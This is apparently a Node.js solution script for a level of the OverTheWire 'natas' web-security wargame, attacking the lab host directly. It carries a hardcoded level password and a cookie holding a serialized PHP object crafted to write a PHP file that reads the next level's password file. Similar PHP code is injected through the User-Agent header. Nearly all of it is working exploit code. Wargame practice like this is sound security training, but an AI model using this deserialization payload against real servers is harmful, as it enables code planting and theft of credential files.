#!/usr/bin/env node
/* eslint-disable */
http = require('http');

credentials = {
    host: 'natas26.natas.labs.overthewire.org',
    login: 'natas26',
    password: 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
}

function toHex(str) {
    str = '' + str
    var result = '';
    for (var i = 0; i < str.length; i++) {
        result += str.charCodeAt(i).toString(16);
    }
    return result;
}

function doReq(n) {
    const id = n
    console.log('start ', id);
    const postData = '';

    const options = {
        host: credentials.host,
        path: '/index.php?debug=true&y1=2&y2=2&x1=99&x2=99',
        method: 'POST',
        auth: `${credentials.login}:${credentials.password}`,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'COOKIE': 'PHPSESSID=aaa;drawing=Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2Fuc3dlci5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MToiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjYiKSA/PiI7fQ==',
            'USER-AGENT': '<?php echo file_get_contents("/etc/natas_webpass/natas26") ?>'

        }
    };

    const req = http.request(options, (res) => {
        console.log(`STATUS:console. ${res.statusCode}`);
        console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
        // console.log(JSON.stringify(res.headers).match(/PHPSESSID=\w*;?/)[0]);
        res.setEncoding('utf8');
        let total = '';
        res.on('data', (chunk) => {
            total += chunk;
        });
        res.on('end', () => {
            console.log(total);
            console.log('end', id)
            process.exit()
        });
    });
    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
        process.exit();
    });

    // write data to request body
    req.write(postData);
    req.end();
}

doReq(1);
